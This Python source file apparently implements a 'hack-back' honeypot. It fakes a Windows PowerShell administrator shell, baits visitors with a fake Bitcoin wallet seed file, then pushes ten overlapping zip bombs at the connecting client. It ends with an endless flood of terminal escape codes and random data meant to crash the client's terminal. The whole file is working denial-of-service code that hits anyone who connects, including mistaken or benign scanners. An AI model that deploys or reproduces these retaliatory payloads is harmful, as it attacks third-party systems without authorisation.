import time
import os
import random
from scripts import zip_generator

def terminal_crusher(client_socket):
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            payload = ansi_bomb + (os.urandom(1024 * 100))
            client_socket.send(payload)
            time.sleep(0.05)
    except: pass

def handle_cowrie_trap(client_socket, ip):
    """Simulación de PowerShell que entrega Bombas TITAN."""
    try:
        # Banner de PowerShell para atraer a Aeternum
        banner = b"Windows PowerShell\r\nCopyright (C) Microsoft Corporation. All rights reserved.\r\n\r\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\r\n\r\n"
        client_socket.send(banner)
        
        prompt = b"PS C:\\Users\\Administrator> "
        
        command_limit = random.randint(3, 5)
        for i in range(command_limit):
            client_socket.send(prompt)
            cmd = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
            if not cmd: break
            
            if "dir" in cmd or "ls" in cmd: 
                client_socket.send(b"\r\n    Directory: C:\\Users\\Administrator\r\n\r\nMode                LastWriteTime         Length Name\r\n----                -------------         ------ ----\r\nd-----        2/26/2026   4:45 PM                Downloads\r\n-a----        2/26/2026   4:46 PM         102400 BTC_Wallet_Seed.txt\r\n-a----        2/26/2026   4:47 PM          45000 config.json\r\n\r\n")
            elif "whoami" in cmd: client_socket.send(b"desktop-hell\\administrator\r\n")
            elif "get-process" in cmd: client_socket.send(b"Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\r\n-------  ------    -----      -----     ------     --  -- ----------\r\n    456      23    45000      67000       1.23   1234   1 powershell\r\n")
            else: client_socket.send(f"The term '{cmd}' is not recognized as the name of a cmdlet, function, script file, or operable program.\r\n".encode())

        # EXPLOIT TITAN: Inyección de 10 bombas solapadas (42kB -> 5.5GB cada una)
        print(f"[💀] POWERSHELL TITAN-MODE: Inyectando 10 Fifield Bombs a {ip}")
        client_socket.send(b"\r\n[!] CRITICAL SYSTEM EXCEPTION: MEMORY PRESSURE DETECTED.\r\n")
        client_socket.send(b"[*] INITIATING EMERGENCY MEMORY DUMP (10 SEGMENTS)...\r\n")
        
        bomb_list = zip_generator.get_bomb_list()
        for index, payload in enumerate(bomb_list):
            client_socket.send(f"\r\n--- TRANSFERRING DUMP_SEGMENT_{index+1}/10 (5.5 GB Expansion) ---\r\n".encode())
            client_socket.send(payload)
            time.sleep(0.1)
        
        client_socket.send(b"\r\n[+] DUMP COMPLETE. TERMINAL CRITICAL FAILURE.\r\n")
        terminal_crusher(client_socket)
        
    except: pass
